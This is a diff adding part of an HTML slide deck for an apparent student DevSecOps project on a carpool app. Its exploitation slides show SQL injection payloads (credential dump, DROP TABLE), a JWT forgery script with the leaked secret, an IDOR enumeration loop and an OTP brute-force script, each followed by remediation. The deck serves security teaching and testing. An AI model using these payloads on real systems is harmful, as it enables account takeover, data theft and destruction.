+        <tr><td class="m">04</td><td class="hi">JWT Forgery — Privilege Escalation</td><td class="m">A07:2021</td><td class="m">9.1</td><td class="re">Critical</td><td class="m">Manual</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">05</td><td>Hardcoded SMTP Credential</td><td class="m">A02:2021</td><td class="m">7.5</td><td class="cy">High</td><td class="m">SAST</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">06</td><td>IDOR — User Profile Enumeration</td><td class="m">A01:2021</td><td class="m">7.5</td><td class="cy">High</td><td class="m">Manual</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">07</td><td>Application Error Disclosure</td><td class="m">A05:2021</td><td class="m">5.3</td><td>Medium</td><td class="m">DAST</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">08</td><td>Weak OTP — No Expiry or Rate Limit</td><td class="m">A07:2021</td><td class="m">5.3</td><td>Medium</td><td class="m">SAST + Manual</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">09</td><td>Role Self-Assignment at Login</td><td class="m">A01:2021</td><td class="m">4.3</td><td>Medium</td><td class="m">Manual</td><td class="gr">Fixed</td></tr>
+        <tr><td class="m">10</td><td>Missing Security Headers</td><td class="m">A05:2021</td><td class="m">3.1</td><td>Low</td><td class="m">DAST</td><td>Accepted</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 14 · EXPLOIT: SQLi ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · 1 of 5</div>
+    <div class="t3">SQL Injection</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 24px;">Unsanitised user input concatenated directly into a raw SQL query. Detectable by SAST, exploitable from the search box.</div>
+    <div class="row" style="grid-template-columns:1fr; max-width:1100px;">
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        <div class="code"><span class="dim">// RideSearchController.cs</span>
+var sql = "SELECT * FROM Rides WHERE Status = 0 " +
+          "AND (Origin LIKE '%" + <span class="hi">query</span> + "%' " +
+          "OR Destination LIKE '%" + <span class="hi">query</span> + "%')";
+_context.Rides.FromSqlRaw(sql) <span class="dim">// S2077 — untrusted input</span></div>
+        <ul class="steps">
+          <li><span class="n">01</span>Enter payload in the ride search box: <code style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#ff8080;">%' OR '1'='1</code> — returns all rides regardless of route</li>
+          <li><span class="n">02</span>Enumerate schema: <code style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#ff8080;">%' UNION SELECT 1,email,password,4,5,6 FROM Users--</code></li>
+          <li><span class="n">03</span>Dump all user credentials from the Users table in a single request</li>
+          <li><span class="n">04</span>Destructive variant: <code style="font-family:'JetBrains Mono',monospace;font-size:12px;color:#ff8080;">%'; DROP TABLE Rides;--</code></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · SQLi ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · SQL Injection · Evidence</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — SQLi PAYLOAD IN BROWSER + RESPONSE
+        <div class="hint">Show unexpected data returned or HTTP response dump</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 15 · EXPLOIT: JWT ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s tight">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · 2 of 5</div>
+    <div class="t3">JWT Forgery</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 24px;">The signing secret is in the source code. Anyone with repository access can forge a token for any user and any role.</div>
+    <div class="row" style="grid-template-columns:1fr; max-width:1100px;">
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        <div class="code"><span class="dim"># Secret exposed by SonarCloud rule S6703</span>
+<span class="dim"># "Jwt:Key": "YourSuperSecretKey123456789101112"</span>
+
+import jwt, time
+forged = jwt.encode({
+    "nameid": "1",
+    "role":   <span class="hi">"admin"</span>,
+    "email":  "attacker@hu.edu.pk",
+    "exp":    int(time.time()) + 86400
+}, <span class="hi">"YourSuperSecretKey123456789101112"</span>)
+
+<span class="dim"># Use forged token against admin endpoints</span>
+curl /api/admin/users -H "Authorization: Bearer {forged}"</div>
+        <ul class="steps">
+          <li><span class="n">01</span>SonarCloud scan reveals hardcoded secret in appsettings.json</li>
+          <li><span class="n">02</span>Forge token with role: admin and any userId using python-jwt</li>
+          <li><span class="n">03</span>Send forged token — /api/admin/users returns all user records</li>
+          <li><span class="n">04</span>Full platform takeover. No valid credentials required.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · JWT Forgery ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · JWT Forgery · Evidence</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — FORGED TOKEN + /api/admin/users 200 RESPONSE
+        <div class="hint">Show jwt.io with secret + curl response with user data</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 16 · EXPLOIT: IDOR ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · 3 of 5</div>
+    <div class="t3">IDOR</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 24px;">No ownership check. Any authenticated user can read any other user's profile by incrementing an integer ID.</div>
+    <div class="row" style="grid-template-columns:1fr; max-width:1100px;">
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        <div class="code"><span class="dim">// PassengerProfileController.cs — no ownership check</span>
+[HttpGet("user/{userId}")]
+public async Task&lt;IActionResult&gt; GetUserProfile(int <span class="hi">userId</span>)
+{
+    var user = await _context.Users.FindAsync(<span class="hi">userId</span>);
+    if (user == null) return NotFound();
+    return Ok(new { user.UserId, user.FullName,
+                    user.UniversityEmail, user.PhoneNumber });
+}
+
+<span class="dim"># Enumerate all users — any valid JWT works</span>
+for id in range(1, 500):
+    curl /api/passengerprofile/user/{id} -H "Authorization: Bearer {jwt}"</div>
+        <ul class="steps">
+          <li><span class="n">01</span>Login as a passenger — obtain a valid JWT</li>
+          <li><span class="n">02</span>GET /api/passengerprofile/user/1 — returns admin profile</li>
+          <li><span class="n">03</span>Iterate user IDs 1–N to enumerate the entire user base</li>
+          <li><span class="n">04</span>Leaks full names, university emails, phone numbers</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · IDOR ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · IDOR · Evidence</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — CURL ITERATING USER IDs + PII RESPONSE
+        <div class="hint">Show sequential requests returning different users' data</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 17 · EXPLOIT: OTP ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s tight">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · 4 of 5</div>
+    <div class="t3">OTP Brute Force</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 24px;">900,000 possible values. No expiry. No rate limit. No lockout. Account takeover in under 20 minutes.</div>
+    <div class="row" style="grid-template-columns:1fr; max-width:1100px;">
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        <div class="code"><span class="dim">// AuthController.cs — non-cryptographic generation</span>
+string otp = new <span class="hi">Random()</span>.Next(100000, 999999).ToString();
+<span class="dim">// No expiry. No attempt counter. No rate limiting.</span>
+OtpStore[dto.UniversityEmail] = otp;
+
+<span class="dim"># Brute-force script</span>
+for otp in range(100000, 999999):
+    r = requests.post("/api/auth/verify-otp",
+        json={"universityEmail": victim, "otp": str(otp)})
+    if r.status_code == 200:
+        break  <span class="dim"># verified — register with attacker password</span></div>
+        <ul class="steps">
+          <li><span class="n">01</span>Trigger OTP send to a victim's university email address</li>
+          <li><span class="n">02</span>Iterate 100000–999999 against /api/auth/verify-otp — no throttle</li>
+          <li><span class="n">03</span>On HTTP 200 — OTP verified. Complete registration with attacker-chosen password.</li>
+          <li><span class="n">04</span>Full account takeover. Victim cannot recover without admin action.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · OTP Brute Force ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · OTP Brute Force · Evidence</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — BRUTE FORCE SCRIPT OUTPUT / BURP INTRUDER
+        <div class="hint">Show iteration hitting 200 OK response</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 18 · EXPLOIT: ERROR DISCLOSURE ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · 5 of 5</div>
+    <div class="t3">Error Disclosure</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 24px;">Full exception detail returned to the client. Stack traces expose internal paths, assembly names, and framework versions.</div>
+    <div class="row" style="grid-template-columns:1fr; max-width:1100px;">
+      <div style="display:flex; flex-direction:column; gap:14px;">
+        <div class="code"><span class="dim">// AuthController.cs — full exception in response body</span>
+catch (Exception ex)
+{
+    return StatusCode(500, new {
+        success = false,
+        message = "Failed to send OTP.",
+        error   = <span class="hi">ex.ToString()</span>  <span class="dim">// S4507 — never do this</span>
+    });
+}
+
+<span class="dim">// Response (HTTP 500):</span>
+{
+  "error": <span class="hi">"MailKit.Net.Smtp.SmtpCommandException: Auth failed
+    at MailKit.Net.Smtp.SmtpClient.AuthenticateAsync()
+    in /src/MailKit/Net/Smtp/SmtpClient.cs:line 1842
+    at CarpoolApp.Server.Services.EmailService..."</span>
+}</div>
+        <ul class="steps">
+          <li><span class="n">01</span>POST /api/auth/send-otp with any email — SMTP fails (bad credentials)</li>
+          <li><span class="n">02</span>HTTP 500 returns full MailKit stack trace in JSON response body</li>
+          <li><span class="n">03</span>Attacker learns internal class paths, library versions, server structure</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · Error Disclosure ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="glow red"></div>
+    <div class="eyebrow">Exploitation · Error Disclosure · Evidence</div>
+    <div class="grid" style="height:620px;">
+      <div class="shot" style="height:620px;">
+        SCREENSHOT — POSTMAN / CURL 500 RESPONSE WITH STACK TRACE
+        <div class="hint">Show full JSON error body with exception detail</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 19 · REMEDIATION ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s tight">
+    <div class="eyebrow">Remediation</div>
+    <div class="t3">Root Cause Fixes</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 28px;">All critical and high findings fixed at root cause. Pipeline re-run after each patch.</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">SQL Injection</div>
+        <div class="val">Parameterised Query</div>
+        <div class="sub">Replaced string concat with FromSqlRaw("{0}", query) — EF Core handles escaping</div>
+      </div>
+      <div class="card">
+        <div class="lbl">JWT Secret</div>
+        <div class="val">Environment Variable</div>
+        <div class="sub">Moved to GitHub Secret / env var. Replaced with 256-bit cryptographically random key.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">IDOR</div>
+        <div class="val">Ownership Enforcement</div>
+        <div class="sub">JWT userId claim must match requested {userId}. Returns 403 Forbidden otherwise.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Error Disclosure</div>
+        <div class="val">Generic Error Response</div>
+        <div class="sub">Removed ex.ToString() from responses. Errors logged server-side only via ILogger.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">OTP</div>
+        <div class="val">Crypto RNG + TTL + Lockout</div>
+        <div class="sub">RandomNumberGenerator replaces new Random(). 5-min expiry. 5-attempt lockout added.</div>
+      </div>
+      <div class="card">
+        <div class="lbl">Dependencies</div>
+        <div class="val">Package Updates</div>
+        <div class="sub">vite, rollup, axios, minimatch updated to patched versions. Unused packages removed.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 20 · BEFORE & AFTER ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="eyebrow">Re-test</div>
+    <div class="t3">Pipeline: Before &amp; After</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 28px;">Quality gates failing on critical findings is the goal during exploitation. Passing after remediation confirms the fixes hold.</div>
+    <div class="row">
+      <div style="display:flex; flex-direction:column; gap:12px;">
+        <div class="card re">
+          <div class="lbl">Before — Exploitation Phase</div>
+          <div class="val">SAST · SCA · DAST: FAIL</div>
+          <div class="sub">3 security issues · 45 CVEs · error disclosure · pipeline blocked on first run</div>
+        </div>
+      </div>
+      <div style="display:flex; flex-direction:column; gap:12px;">
+        <div class="card gr">
+          <div class="lbl">After — Remediation Phase</div>
+          <div class="val">SAST · SCA · DAST: PASS</div>
+          <div class="sub">All critical and high findings resolved · quality gates green · re-test confirmed</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══ SCREENSHOT · Pipeline Before & After ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s tight">
+    <div class="eyebrow">Re-test · GitHub Actions · Before &amp; After</div>
+    <div class="grid g2" style="height:580px; gap:24px;">
+      <div class="shot" style="height:580px;">
+        SCREENSHOT — GITHUB ACTIONS FAILING RUN
+        <div class="hint">Show red X checks on SAST, SCA, DAST jobs</div>
+      </div>
+      <div class="shot" style="height:580px;">
+        SCREENSHOT — GITHUB ACTIONS PASSING RUN
+        <div class="hint">Show green checkmarks on all three security jobs</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 21 · LIVE DEMO ══ -->
+<section data-background-color="#f5ead6">
+  <div class="s">
+    <div class="glow"></div>
+    <div class="eyebrow">Demonstration</div>
+    <div class="t2">Live Demo</div>
+    <div class="rule"></div>
+    <div class="tagline" style="margin-bottom: 48px;">Full app walkthrough · live exploit · fix proof · pipeline shown live</div>
+    <div class="grid g3">
+      <div class="card">
+        <div class="lbl">01</div>
+        <div class="val">App Walkthrough</div>
+        <div class="sub">Register via OTP · login as driver · create ride · book as passenger · admin panel</div>
+      </div>
+      <div class="card re">
+        <div class="lbl">02</div>
+        <div class="val">Live Attack</div>
+        <div class="sub">SQL injection or JWT forgery demonstrated live — real data extracted or privilege escalated</div>
+      </div>
+      <div class="card gr">
+        <div class="lbl">03</div>
+        <div class="val">Fix Proof</div>
+        <div class="sub">Same attack on patched build — 403 / parameterised query — pipeline passing in CI</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════ 22 · Q&A ══ -->
+<section data-background-color="#1440a8" class="blue-slide">
+  <div class="s">
+    <div class="glow"></div>
+    <div class="eyebrow">Thank You</div>
+    <div class="t1">Questions?</div>
+    <div class="rule"></div>
+    <div class="tagline">UniRide — DevSecOps Secure Application Pipeline · Habib University · May 2026</div>
+    <div class="meta">
+      <strong>Muhammad Shayaan</strong> &nbsp;·&nbsp; App Development &amp; Pipeline<br>
+      <strong>Muhammad Hayyan Khan</strong> &nbsp;·&nbsp; Security &amp; Exploitation<br>
+      <strong>Muhammad Wajeeh Haider</strong> &nbsp;·&nbsp; Exploitation &amp; Report<br>
+      <strong>Ikhlas Ahmed</strong> &nbsp;·&nbsp; Threat Model &amp; Documentation
+    </div>
+  </div>
+</section>
+
+
+</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
+<script>
+  Reveal.initialize({
+    width: 1600, height: 900,
+    margin: 0, minScale: 0.1, maxScale: 2,
+    controls: true,
+    progress: true,
+    history: true,
+    center: false,
+    transition: 'fade',
+    transitionSpeed: 'slow',
+    slideNumber: false,
+    keyboard: true,
+    touch: true,
+    mouseWheel: true,
+  });
+
+  function updateChrome() {
+    const current = Reveal.getCurrentSlide();
+    const isBlue = current?.classList.contains('blue-slide');
+    const controls = document.querySelectorAll('.reveal .controls button');
+    const progressSpan = document.querySelector('.reveal .progress span');
+    const progressBar = document.querySelector('.reveal .progress');
+
+    if (isBlue) {
+      controls.forEach(btn => btn.setAttribute('style', 'color: #f5ead6 !important; border-color: #f5ead6 !important;'));
+      if (progressSpan) progressSpan.style.setProperty('background', '#ffffff', 'important');
+      if (progressBar) { progressBar.style.setProperty('height', '5px', 'important'); progressBar.style.setProperty('background', 'rgba(255,255,255,0.25)', 'important'); }
+    } else {
+      controls.forEach(btn => btn.setAttribute('style', 'color: rgba(20,64,168,0.55) !important; border-color: rgba(20,64,168,0.55) !important;'));
+      if (progressSpan) progressSpan.style.setProperty('background', '#1440a8', 'important');
+      if (progressBar) { progressBar.style.setProperty('height', '5px', 'important'); progressBar.style.setProperty('background', 'rgba(20,64,168,0.25)', 'important'); }
+    }
+  }
+
+  Reveal.on('slidechanged', updateChrome);
+  updateChrome();
+
+  document.addEventListener('click', function(e) {
+    if (e.target.closest('.slides')) Reveal.next();
+  }, false);
+</script>
+</body>
+</html>
